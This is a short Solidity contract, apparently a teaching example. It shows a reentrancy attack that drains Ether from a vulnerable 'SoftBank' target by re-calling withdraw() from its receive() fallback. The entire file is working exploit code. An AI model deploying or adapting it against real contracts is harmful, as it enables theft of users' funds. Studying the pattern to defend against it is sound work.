// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import { TargetContract } from "./SoftBank.sol";

// BadContract is a contract that attacks the TargetContract contract
// by exploiting the reentrancy vulnerability in the withdraw function.
contract BadContract {
    TargetContract public targetContract;// The contract to attack

    constructor(address _targetContractAddress) {
        targetContract = TargetContract(_targetContractAddress);// Set the target contract
    }

     // Starts the attack
    function attack() public payable {
        targetContract.addBalance{value: msg.value}();// Deposit some Ether
        targetContract.withdraw();// Withdraw the Ether
    }

    
    /* This function is called when the contract receives Ether
      and it calls the withdraw function to exploit the reentrancy vulnerability   
     This function is marked as payable so that it can receive Ether
    */
    receive() external payable {
        if (address(targetContract).balance > 0) {
            targetContract.withdraw();
        }
    }
}